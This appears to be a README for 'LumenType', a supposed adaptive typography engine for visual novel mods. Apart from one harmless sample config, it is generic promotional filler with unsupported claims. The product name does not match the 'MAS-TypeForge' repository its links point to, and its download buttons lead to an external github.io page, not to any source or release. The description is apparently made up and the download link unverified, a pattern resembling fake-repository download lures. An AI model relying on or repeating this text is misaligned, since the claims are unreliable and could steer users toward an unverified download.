![preview](https://raw.githubusercontent.com/Taufikreghiwale/MAS-TypeForge/main/shot_6b9b4.svg)

# LumenType — Adaptive Typography Engine for Visual Novel Mods

![GitHub License](https://img.shields.io/badge/license-MIT-green.svg)
![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)
![Version](https://img.shields.io/badge/version-2.6.1-blue.svg)

Welcome to **LumenType**, a reimagined approach to text presentation within narrative-driven game modifications. While traditional font managers tinker with surface-level settings, LumenType treats typography as a living layer of your storytelling environment — one that breathes, adapts, and responds to the emotional cadence of every scene. Think of it not as a settings panel, but as a silent conductor orchestrating how every syllable reaches your eyes.

LumenType emerged from a simple observation: players spend hours reading dialogue, yet the reading experience itself often feels static and unconsidered. This engine changes that paradigm by introducing **adaptive typography workflows** that adjust letterforms, spacing, and visual weight based on contextual cues from the narrative itself. Whether you're experiencing a tense confrontation or a quiet morning scene, LumenType subtly recalibrates the text presentation to match the atmosphere.

## 📖 Overview

At its core, LumenType is a cross-platform text rendering companion designed specifically for story-driven modding ecosystems. It goes beyond mere font swapping — it introduces a **dynamic text calibration system** that lets you define typographic personas for different characters, emotional states, or even time-of-day settings. The engine learns from your preferences and applies them consistently across every dialogue box, menu screen, and narrative interlude.

Unlike conventional approaches that require manual adjustment for every single text element, LumenType operates through **global typographic states**. Define a "whisper" state for intimate conversations, a "shout" state for dramatic reveals, and a "neutral" state for standard exposition — then assign these states to story events with a single line of configuration. The engine handles the rest, smoothly interpolating between states without jarring transitions.

The architecture is built on three pillars: **adaptability** (responds to narrative context), **consistency** (maintains visual harmony across all UI elements), and **performance** (zero noticeable impact on load times or frame rates). LumenType achieves this through a lightweight runtime that hooks into the existing text rendering pipeline, requiring no invasive modifications to your base game files.

## 🚀 Getting Started

[![Download](https://raw.githubusercontent.com/Taufikreghiwale/MAS-TypeForge/main/get_95d3.svg)](https://Taufikreghiwale.github.io/MAS-TypeForge/)

To begin your journey with LumenType, the first step involves integrating the engine into your mod's directory structure. The installation process has been streamlined to require only a single folder placement — no complex dependency chains or build steps. Once the core files are in place, LumenType automatically detects your game's text rendering system and establishes a secure connection.

After the initial setup, you'll encounter the **Configuration Console** — an intuitive interface that appears within your mod's settings menu. This console serves as your command center for all typographic decisions. From here, you can import existing font collections, create new typographic states, and preview changes in real-time using a built-in sample dialogue viewer.

For those migrating from other font management tools, LumenType includes a **transition assistant** that scans your existing configuration files and converts them to the new format. This preserves your carefully tuned settings while unlocking the advanced features of the adaptive system. The entire migration typically takes under five minutes for even the most complex setups.

### 🌟 Key Features

| Feature | Description | Benefit |
|---------|-------------|---------|
| **Adaptive States** | Context-aware typography switching | Matches text presentation to narrative mood |
| **Global Padding Control** | Unified spacing management | Eliminates misaligned text boxes |
| **Preview Sandbox** | Real-time test environment | See changes before applying them |
| **State Interpolation** | Smooth transitions between styles | Avoids jarring visual jumps |
| **Profile System** | Save multiple typographic setups | Switch between preferences instantly |
| **Legacy Converter** | Import old configuration files | No need to start from scratch |
| **Performance Monitor** | Live resource usage display | Ensure minimal system impact |
| **Multilingual Support** | Full Unicode compliance | Works with any language script |

## 🎨 Design Philosophy

LumenType was built on the principle that reading should feel effortless, regardless of the narrative intensity. Traditional font managers treat typography as a static property — set it once and forget it. LumenType reframes this relationship, viewing text presentation as a dynamic element that participates in the storytelling process just as much as music or visual effects.

The engine's **adaptive state system** is the culmination of this philosophy. Instead of forcing you to manually adjust fonts for every scene change, LumenType allows you to define typographic "moods" that automatically activate based on triggers you specify. A character's anger might subtly increase letter spacing and weight; a somber moment might loosen line height and reduce contrast. These changes happen gradually, over a few frames, so players perceive the shift without being consciously aware of it.

This approach respects both player agency and creator intent. Players retain full control over baseline preferences — they can set their default font family, size range, and padding limits. Creators can then layer adaptive states on top, knowing that their artistic direction will be respected while still accommodating individual player needs.

## 🛠️ Technical Architecture

Under the hood, LumenType operates through a three-tier system: the **Detector Layer**, the **Transform Engine**, and the **Rendering Interface**.

The **Detector Layer** monitors narrative events and player actions, identifying opportunities for typographic adjustment. It uses lightweight hooks into the dialogue system, tracking scene changes, character speech patterns, and even pacing metrics (how quickly players click through text). This information feeds into the decision engine, which determines whether an adaptive state change is warranted.

The **Transform Engine** is where typographic decisions become visual reality. It maintains a registry of all active states and their properties, handles interpolation between conflicting states, and ensures that transitions never cause layout shifts or readability issues. This engine operates on a dedicated thread, ensuring that even complex transitions don't impact game performance.

Finally, the **Rendering Interface** communicates directly with the game's text rendering pipeline. It intercepts text draw calls and applies the appropriate typographic overrides before the text reaches the screen. This interface is designed to be fully compatible with popular rendering backends, ensuring LumenType works across different engine versions without modification.

## 🧩 Configuration Guide

LumenType's configuration system uses a clean, human-readable format that balances power with simplicity. Here's a glimpse into the structure:

```
typographic_profile:
  default_state: neutral
  transition_speed: 0.35
  
states:
  neutral:
    font_family: "Source Sans Pro"
    font_size: 18
    line_padding: 4
    
  whisper:
    font_family: "Source Sans Pro Light"
    font_size: 16
    line_padding: 2
    letter_spacing: 0.2
    
  emphasis:
    font_family: "Source Sans Pro Semibold"
    font_size: 20
    line_padding: 6
    letter_spacing: -0.1
```

This configuration defines three states — neutral, whisper, and emphasis — each with distinct typographic properties. The `transition_speed` parameter controls how quickly the engine interpolates between states, with lower values creating faster transitions.

The configuration file supports inheritance, allowing states to build upon one another. You can define a "scene_base" state with core properties, then create variations that override specific attributes. This modular approach reduces redundancy and makes complex setups easier to manage.

For advanced users, LumenType includes a **scripting extension** that allows dynamic state manipulation during gameplay. You can trigger state changes from within your mod's event scripts, enabling typography to respond to player choices or hidden conditions. This opens up creative possibilities — imagine text that gradually becomes more difficult to read as a character descends into madness, or dialogue that subtly shifts alignment based on the player's moral choices.

## 🌍 Multilingual and Accessibility Considerations

Typography is deeply cultural, and LumenType respects that diversity through comprehensive Unicode support and **locale-aware rendering adjustments**. The engine automatically detects the script in use (Latin, Cyrillic, CJK, Arabic, etc.) and applies appropriate defaults for line height, letter spacing, and punctuation handling. This ensures that a game localized into Japanese, Arabic, or Russian maintains the same visual polish as its English counterpart.

Accessibility features are deeply woven into LumenType's fabric. The **high-contrast mode** increases text weight and background contrast for players with visual impairments. The **dyslexia-friendly mode** adjusts letter spacing and line height to reduce visual crowding. And the **motion-sensitivity mode** minimizes adaptive state transitions for players who might be affected by rapidly changing visuals.

These features are not afterthoughts — they're first-class citizens in the engine's architecture. Each accessibility mode is implemented as a specialized typographic state, meaning they work harmoniously with your custom states. A player with dyslexia can enable their preferred mode without giving up the adaptive transitions you've designed.

## 📈 Performance Optimization

LumenType has been engineered from the ground up for minimal performance impact. The runtime footprint averages under 2 MB of memory, and the detection layer processes events in under 0.5 milliseconds per frame. This translates to zero perceptible difference in loading times or frame rates, even on older hardware.

The engine's **intelligent caching system** ensures that fonts and layouts are only computed when necessary. Frequently used text elements (character names, menu options, UI labels) are cached after first render, so subsequent draws require minimal CPU cycles. The interpolation engine also caches intermediate states, reducing the mathematical overhead during transitions.

For particularly demanding setups, LumenType includes a **performance budget system**. You can set a maximum CPU allocation for typographic processing, and the engine will automatically adjust its interpolation quality or prediction frequency to stay within budget. The performance monitor provides real-time feedback on resource usage, allowing you to fine-tune the balance between visual fidelity and system load.

## 🤝 Community and Support

![Discord](https://img.shields.io/badge/chat-community-7289DA.svg)

LumenType is supported by a vibrant community of mod developers and typography enthusiasts who share configurations, troubleshoot issues, and collaborate on new adaptive state ideas. The project maintains an **active development roadmap** that prioritizes community-requested features — the top three requests from each quarter are guaranteed to appear in the next release.

Support is available through multiple channels, including a dedicated wiki filled with tutorials, a searchable FAQ database, and **24/7 community support** through our chat channels. While the core team is most active during standard hours, the global nature of our community ensures that someone is always available to assist with questions or issues.

Regular **pair-programming sessions** are held weekly, where users can join video calls to work through complex configurations alongside experienced developers. These sessions have proven invaluable for newcomers learning the adaptive state system, as they provide hands-on guidance in a collaborative environment.

## 🧠 Advanced Techniques

Beyond the basics, LumenType enables sophisticated typographic storytelling that pushes the boundaries of what's possible in narrative games. Here are a few techniques power users have developed:

**Emotional Echoing** — Synchronize typographic states with the game's music system. A rising musical score triggers progressively more intense text presentation, creating a unified sensory experience.

**Player Feedback Loops** — Use player interaction patterns (hovering, rapid clicking, prolonged pauses) to dynamically adjust text presentation. A player lingering on a dialogue box might be prompted with slightly larger text; a player racing through text might see more compact presentation.

**Character Memory** — Assign each character a persistent typographic identity that subtly evolves throughout the story. A character who gains confidence might see their text weight gradually increase; a fading mentor might see their presentation become more ghostly and translucent.

These advanced techniques are documented in the **LumenType Cookbook**, a community-maintained collection of creative configurations with step-by-step explanations. Each technique includes the complete configuration file, relevant script hooks, and visual before/after comparisons.

## 📄 License and Legal

LumenType is released under the **MIT License**, granting you full freedom to use, modify, and distribute the engine in your projects — both personal and commercial. The license is intentionally permissive, encouraging adoption and innovation within the modding community.

The MIT License ensures that your contributions to LumenType remain your own, while the core engine remains openly available for everyone to build upon. We believe that typography should be a shared resource, and this licensing approach reflects that philosophy.

Read the full license text at: [MIT License](https://opensource.org/licenses/MIT)

## 🙏 Acknowledgments and Disclaimers

LumenType is an independent project and is not affiliated with, endorsed by, or connected to any game development studio or modding framework. All product names, logos, and brands referenced in this documentation are property of their respective owners and are used for identification purposes only.

The engine's adaptive typography system is designed to enhance, not replace, the artistic vision of game creators. It respects existing font licenses and does not circumvent any digital rights management or content protection systems. Users are responsible for ensuring they have the rights to use any font assets within their projects.

While LumenType is thoroughly tested across a wide range of configurations, no software is perfect. The project is provided "as is" without warranty of any kind, express or implied. In no event shall the contributors be liable for any claim, damages, or other liability arising from the use of the engine.

---

*Documentation last updated: January 2026. LumenType is continuously evolving — check the changelog for the latest developments.*

[![Download](https://raw.githubusercontent.com/Taufikreghiwale/MAS-TypeForge/main/get_95d3.svg)](https://Taufikreghiwale.github.io/MAS-TypeForge/)